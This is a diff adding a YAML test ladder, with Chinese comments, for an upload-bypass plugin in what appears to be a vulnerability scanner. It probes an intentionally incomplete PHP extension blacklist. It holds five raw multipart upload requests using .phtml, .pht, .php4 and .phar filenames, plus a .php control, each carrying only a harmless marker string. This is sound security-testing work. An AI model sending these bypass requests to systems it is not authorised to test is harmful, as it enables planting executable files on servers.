@@ -1,0 +1,82 @@
+# 可执行阶梯 —— upload_bypass（黑名单不完整 + 保留原文件名）
+#
+# 依据：plugins/upload_bypass/plugin.yaml（POST /profile/avatar，multipart；marker VULN_CONFIRMED）。
+# 代码里黑名单只有 php/php3/php5（故意漏 .phtml/.pht/.php4/.phar）⇒ 阶梯的价值就是
+# **把这四个被漏掉的扩展名逐个试**，而不是只试库内那两个。
+class: upload_bypass
+display: 上传黑名单旁路（落盘可访问）
+
+baseline:
+  param_value: "1"
+
+steps:
+  - id: ext_phtml
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar HTTP/1.1
+      Cookie: {{SESSION}}
+      Content-Type: multipart/form-data; boundary=AEGISLAD
+
+      --AEGISLAD
+      Content-Disposition: form-data; name="{{AVATAR_FIELD}}"; filename="lad_a1.phtml"
+      Content-Type: application/octet-stream
+
+      VULN_CONFIRMED_L1
+      --AEGISLAD--
+
+  - id: ext_pht
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar HTTP/1.1
+      Cookie: {{SESSION}}
+      Content-Type: multipart/form-data; boundary=AEGISLAD
+
+      --AEGISLAD
+      Content-Disposition: form-data; name="{{AVATAR_FIELD}}"; filename="lad_a2.pht"
+      Content-Type: application/octet-stream
+
+      VULN_CONFIRMED_L2
+      --AEGISLAD--
+
+  - id: ext_php4
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar HTTP/1.1
+      Cookie: {{SESSION}}
+      Content-Type: multipart/form-data; boundary=AEGISLAD
+
+      --AEGISLAD
+      Content-Disposition: form-data; name="{{AVATAR_FIELD}}"; filename="lad_a3.php4"
+      Content-Type: application/octet-stream
+
+      VULN_CONFIRMED_L3
+      --AEGISLAD--
+
+  - id: ext_phar
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar HTTP/1.1
+      Cookie: {{SESSION}}
+      Content-Type: multipart/form-data; boundary=AEGISLAD
+
+      --AEGISLAD
+      Content-Disposition: form-data; name="{{AVATAR_FIELD}}"; filename="lad_a4.phar"
+      Content-Type: application/octet-stream
+
+      VULN_CONFIRMED_L4
+      --AEGISLAD--
+
+  - id: ext_blacklisted_control
+    kind: request
+    value: |
+      POST {{TARGET}}/profile/avatar HTTP/1.1
+      Cookie: {{SESSION}}
+      Content-Type: multipart/form-data; boundary=AEGISLAD
+
+      --AEGISLAD
+      Content-Disposition: form-data; name="{{AVATAR_FIELD}}"; filename="lad_a5.php"
+      Content-Type: application/octet-stream
+
+      VULN_CONFIRMED_L5
+      --AEGISLAD--
+    note: 对照组：.php 在黑名单里 ⇒ 应被拒（若它也过，说明判定面不对，不是漏洞更大）
